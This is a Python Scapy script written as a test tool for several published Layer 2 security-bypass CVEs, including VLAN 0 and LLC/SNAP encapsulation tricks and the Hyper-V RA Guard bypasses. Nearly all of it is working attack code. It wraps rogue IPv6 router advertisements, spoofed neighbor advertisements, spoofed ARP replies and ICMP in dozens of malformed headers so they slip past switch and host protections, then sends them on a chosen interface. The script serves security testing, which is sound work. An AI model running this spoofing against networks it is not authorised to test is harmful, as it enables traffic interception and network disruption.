# Test script for
# VU#855201 :
# CVE-2021-27853
# CVE-2021-27854
# CVE-2021-27861
# CVE-2021-27862
# Microsoft HyperV RA Guard bypass :
# CVE-2020-17040
# CVE-2021-28444
# CVE-2022-21905
# And maybe some more :)
# Etienne Champetier (@champtar)
# https://blog.champtar.fr/VLAN0_LLC_SNAP/

from scapy.all import *
#conf.verb = 0 # turn off scapy messages
import argparse

parser = argparse.ArgumentParser(
    formatter_class=argparse.RawTextHelpFormatter,
    description='''This script sends various packet types encapsulated in combination of
VLAN 0 and/or LLC/SNAP headers, with/without invalid length, to help test L2 security.
This script is not exhaustive and is provided 'as is' without warranty of any kind.
Tested on Linux 5.19 (Fedora 36) using Scapy 2.4.5.''',
    epilog="Written by Etienne Champetier (@champtar), version 2022-09-27_1"
)
parser.add_argument('-i', '--ifname', required=True, dest='ifname', type=str, help='Name of the interface to send IPv6 RA on')
parser.add_argument('--i-want-to-break-my-network', required=True, action='store_true', help='Confirm you understand that running this script might disrupt your network')
parser.add_argument('--print-packet', dest='printpacket', action='store_true', help='Print the packet in scapy format before sending')
parser.add_argument('--print-hex', dest='printhex', action='store_true', help='Print the packet in hex format before sending')
subparsers = parser.add_subparsers(title='packet type', dest='pkt_type')

parser_ipv6_ra = subparsers.add_parser('ipv6_ra')
parser_ipv6_ra.add_argument('src', type=str, help='source IP (use link local ip of the interface)')
parser_ipv6_ra.add_argument('dst', type=str, help='destination IP (use "ff02::1")')

parser_ipv6_nd = subparsers.add_parser('ipv6_nd')
parser_ipv6_nd.add_argument('src', type=str, help='IPv6 to impersonate')
parser_ipv6_nd.add_argument('dst', type=str, help='IPv6 of the victim')

parser_ipv6_nd = subparsers.add_parser('arp')
parser_ipv6_nd.add_argument('ipv4', type=str, help='IPv4 to impersonate')

parser_ipv6_icmp = subparsers.add_parser('ipv6_icmp')
parser_ipv6_icmp.add_argument('src', type=str, help='source IP')
parser_ipv6_icmp.add_argument('dst', type=str, help='destination IP')

parser_ipv4_icmp = subparsers.add_parser('ipv4_icmp')
parser_ipv4_icmp.add_argument('src', type=str, help='source IP')
parser_ipv4_icmp.add_argument('dst', type=str, help='destination IP')

args = parser.parse_args()

ifname = args.ifname
pkt_type = args.pkt_type
src_mac = get_if_hwaddr(ifname)

if pkt_type == 'ipv6_ra':
    #ethertype = 0x8100
    l3 = IPv6(src=args.src, dst=args.dst)
    l3 /= ICMPv6ND_RA(chlim=64, prf='High', routerlifetime=1800)
    l3 /= ICMPv6NDOptSrcLLAddr(lladdr=src_mac)
    l3 /= ICMPv6NDOptMTU(mtu=1500)
    l3 /= ICMPv6NDOptPrefixInfo(prefix="2001:db8:ffff::", prefixlen=64, validlifetime=1810, preferredlifetime=1800)
    dst_mac = getmacbyip6(args.dst)
elif pkt_type == 'ipv6_nd':
    #ethertype = 0x8100
    l3 = IPv6(src=args.src, dst=args.dst)/ICMPv6ND_NA(tgt=args.src, R=0)/ICMPv6NDOptDstLLAddr(lladdr=src_mac)
    dst_mac = getmacbyip6(args.dst)
elif pkt_type == 'arp':
    #ethertype = 0x0806
    l3 = ARP(op='is-at',hwsrc=src_mac,psrc=args.ipv4,hwdst='ff:ff:ff:ff:ff:ff',pdst=args.ipv4)
    dst_mac = 'ff:ff:ff:ff:ff:ff'
elif pkt_type == 'ipv6_icmp':
    #ethertype = 0x8100
    l3 = IPv6(src=args.src, dst=args.dst)/ICMPv6EchoRequest()
    dst_mac = getmacbyip6(args.dst)
elif pkt_type == 'ipv4_icmp':
    #ethertype = 0x0800
    l3 = IP(src=args.src, dst=args.dst)/ICMP()
    dst_mac = getmacbyip(args.dst)
else:
    sys.exit(1)

hdr_list = [
    Ether(src=src_mac,dst=dst_mac),
    Ether(src=src_mac,dst=dst_mac)/Dot1Q(vlan=0),
    # Accepted only by Linux target ?
    Ether(src=src_mac,dst=dst_mac)/Dot1Q(vlan=0)/Dot1Q(vlan=0),
    Ether(src=src_mac,dst=dst_mac)/Dot1AD(vlan=0),
    Ether(src=src_mac,dst=dst_mac)/Dot1AD(vlan=0)/Dot1AD(vlan=0),
    Ether(src=src_mac,dst=dst_mac)/Dot1Q(vlan=0)/Dot1AD(vlan=0),
    Ether(src=src_mac,dst=dst_mac)/Dot1AD(vlan=0)/Dot1Q(vlan=0),
    Ether(src=src_mac,dst=dst_mac)/Dot1Q(vlan=0)/Dot1Q(vlan=0)/Dot1Q(vlan=0)/Dot1Q(vlan=0)/Dot1Q(vlan=0),
    Ether(src=src_mac,dst=dst_mac)/Dot1AD(vlan=0)/Dot1AD(vlan=0)/Dot1AD(vlan=0)/Dot1AD(vlan=0)/Dot1AD(vlan=0),
    Ether(src=src_mac,dst=dst_mac)/Dot1AD(vlan=0)/Dot1Q(vlan=0)/Dot1AD(vlan=0)/Dot1Q(vlan=0)/Dot1AD(vlan=0),
    Ether(src=src_mac,dst=dst_mac)/Dot1Q(vlan=0)/Dot1AD(vlan=0)/Dot1Q(vlan=0)/Dot1AD(vlan=0)/Dot1Q(vlan=0),
    # Accepted by Windows, converted by Linux mac80211 and accepted by all Wireless clients
    Dot3(src=src_mac,dst=dst_mac)/LLC(ctrl=3)/SNAP(OUI=0x000000),
    Dot3(src=src_mac,dst=dst_mac)/LLC(ctrl=3)/SNAP(OUI=0x0000f8),
    # Accepted by Windows
    Ether(src=src_mac,dst=dst_mac)/Dot1Q(vlan=0,type=len(LLC()/SNAP()/l3))/LLC(ctrl=3)/SNAP(OUI=0x000000),
    Ether(src=src_mac,dst=dst_mac)/Dot1Q(vlan=0,type=len(LLC()/SNAP()/l3))/LLC(ctrl=3)/SNAP(OUI=0x0000f8),
    # Accepted by nothing ?
    Ether(src=src_mac,dst=dst_mac)/Dot1AD(vlan=0,type=len(LLC()/SNAP()/l3))/LLC(ctrl=3)/SNAP(OUI=0x000000),
    Ether(src=src_mac,dst=dst_mac)/Dot1AD(vlan=0,type=len(LLC()/SNAP()/l3))/LLC(ctrl=3)/SNAP(OUI=0x0000f8),
    Ether(src=src_mac,dst=dst_mac)/Dot1Q(vlan=0)/Dot1Q(vlan=0)/Dot1Q(vlan=0)/Dot1Q(vlan=0)/Dot1Q(vlan=0,type=len(LLC()/SNAP()/l3))/LLC(ctrl=3)/SNAP(OUI=0x000000),
    Ether(src=src_mac,dst=dst_mac)/Dot1Q(vlan=0)/Dot1Q(vlan=0)/Dot1Q(vlan=0)/Dot1Q(vlan=0)/Dot1Q(vlan=0,type=len(LLC()/SNAP()/l3))/LLC(ctrl=3)/SNAP(OUI=0x0000f8),
    Ether(src=src_mac,dst=dst_mac)/Dot1AD(vlan=0)/Dot1AD(vlan=0)/Dot1AD(vlan=0)/Dot1AD(vlan=0)/Dot1AD(vlan=0,type=len(LLC()/SNAP()/l3))/LLC(ctrl=3)/SNAP(OUI=0x000000),
    Ether(src=src_mac,dst=dst_mac)/Dot1AD(vlan=0)/Dot1AD(vlan=0)/Dot1AD(vlan=0)/Dot1AD(vlan=0)/Dot1AD(vlan=0,type=len(LLC()/SNAP()/l3))/LLC(ctrl=3)/SNAP(OUI=0x0000f8),
    # Converted by Linux mac80211, accepted by all Wireless clients except Android (for IPv6 RA, ARP/ND spoofing might work)
    Dot3(src=src_mac,dst=dst_mac)/LLC(ctrl=3)/SNAP(OUI=0x000000)/Dot1Q(vlan=0),
    Dot3(src=src_mac,dst=dst_mac)/LLC(ctrl=3)/SNAP(OUI=0x0000f8)/Dot1Q(vlan=0),
    # Converted by Linux mac80211, accepted by Linux Wireless clients
    Dot3(src=src_mac,dst=dst_mac)/LLC(ctrl=3)/SNAP(OUI=0x000000,code=0x88a8)/Dot1AD(vlan=0),
    Dot3(src=src_mac,dst=dst_mac)/LLC(ctrl=3)/SNAP(OUI=0x0000f8,code=0x88a8)/Dot1AD(vlan=0),
    Dot3(src=src_mac,dst=dst_mac)/LLC(ctrl=3)/SNAP(OUI=0x000000)/Dot1Q(vlan=0)/Dot1Q(vlan=0)/Dot1Q(vlan=0)/Dot1Q(vlan=0)/Dot1Q(vlan=0),
    Dot3(src=src_mac,dst=dst_mac)/LLC(ctrl=3)/SNAP(OUI=0x0000f8)/Dot1Q(vlan=0)/Dot1Q(vlan=0)/Dot1Q(vlan=0)/Dot1Q(vlan=0)/Dot1Q(vlan=0),
    Dot3(src=src_mac,dst=dst_mac)/LLC(ctrl=3)/SNAP(OUI=0x000000,code=0x88a8)/Dot1AD(vlan=0)/Dot1AD(vlan=0)/Dot1AD(vlan=0)/Dot1AD(vlan=0)/Dot1AD(vlan=0),
    Dot3(src=src_mac,dst=dst_mac)/LLC(ctrl=3)/SNAP(OUI=0x0000f8,code=0x88a8)/Dot1AD(vlan=0)/Dot1AD(vlan=0)/Dot1AD(vlan=0)/Dot1AD(vlan=0)/Dot1AD(vlan=0),
    # Accepted by nothing ?
    Ether(src=src_mac,dst=dst_mac)/Dot1Q(vlan=0,type=len(LLC()/SNAP()/Dot1Q()/l3))/LLC(ctrl=3)/SNAP(OUI=0x000000,code=0x8100)/Dot1Q(vlan=0),
    Ether(src=src_mac,dst=dst_mac)/Dot1Q(vlan=0,type=len(LLC()/SNAP()/Dot1Q()/l3))/LLC(ctrl=3)/SNAP(OUI=0x0000f8,code=0x8100)/Dot1Q(vlan=0),
    Ether(src=src_mac,dst=dst_mac)/Dot1AD(vlan=0,type=len(LLC()/SNAP()/Dot1AD()/l3))/LLC(ctrl=3)/SNAP(OUI=0x000000,code=0x88a8)/Dot1AD(vlan=0),
    Ether(src=src_mac,dst=dst_mac)/Dot1AD(vlan=0,type=len(LLC()/SNAP()/Dot1AD()/l3))/LLC(ctrl=3)/SNAP(OUI=0x0000f8,code=0x88a8)/Dot1AD(vlan=0),
    # Invalid length
    Dot3(src=src_mac,dst=dst_mac,len=0)/LLC(ctrl=3)/SNAP(OUI=0x000000),
    Dot3(src=src_mac,dst=dst_mac,len=0x05ff)/LLC(ctrl=3)/SNAP(OUI=0x000000),
    Ether(src=src_mac,dst=dst_mac)/Dot1Q(vlan=0,type=0)/LLC(ctrl=3)/SNAP(OUI=0x000000),
    Ether(src=src_mac,dst=dst_mac)/Dot1Q(vlan=0,type=0x05ff)/LLC(ctrl=3)/SNAP(OUI=0x000000),
    Ether(src=src_mac,dst=dst_mac)/Dot1Q(vlan=0)/Dot1Q(vlan=0,type=0)/LLC(ctrl=3)/SNAP(OUI=0x000000),
    Ether(src=src_mac,dst=dst_mac)/Dot1Q(vlan=0)/Dot1Q(vlan=0,type=0x05ff)/LLC(ctrl=3)/SNAP(OUI=0x000000),
    # IEEE 802a OUI extended EtherType, Accepted by nothing ?
    Ether(src=src_mac,dst=dst_mac,type=0x88b7)/SNAP(OUI=0x000000),
    Ether(src=src_mac,dst=dst_mac,type=0x88b7)/SNAP(OUI=0x0000f8),
    Dot3(src=src_mac,dst=dst_mac)/LLC(ctrl=3)/SNAP(OUI=0x000000,code=0x88b7)/SNAP(OUI=0x000000),
    Dot3(src=src_mac,dst=dst_mac)/LLC(ctrl=3)/SNAP(OUI=0x0000f8,code=0x88b7)/SNAP(OUI=0x000000),
    Dot3(src=src_mac,dst=dst_mac)/LLC(ctrl=3)/SNAP(OUI=0x000000,code=0x88b7)/SNAP(OUI=0x0000f8),
    Dot3(src=src_mac,dst=dst_mac)/LLC(ctrl=3)/SNAP(OUI=0x0000f8,code=0x88b7)/SNAP(OUI=0x0000f8),
    # Jumbo LLC / 0x8870, Accepted by nothing ?
    Ether(src=src_mac,dst=dst_mac,type=0x8870)/LLC(ctrl=3)/SNAP(OUI=0x000000),
    Ether(src=src_mac,dst=dst_mac,type=0x8870)/LLC(ctrl=3)/SNAP(OUI=0x0000f8),
]

s = conf.L2socket(iface=ifname)
for i in range(len(hdr_list)):
    print('\n# Sending header %i'%i)
    if pkt_type == 'ipv6_ra':
        l3.getlayer(ICMPv6NDOptPrefixInfo).prefix='2001:db8:%i::'%i
    p = hdr_list[i]/l3
    p = p.__class__(bytes(p))
    if args.printpacket:
        print(p.command())
    if args.printhex:
        print(bytes(p).hex())

    s.send(p)
    time.sleep(0.2)
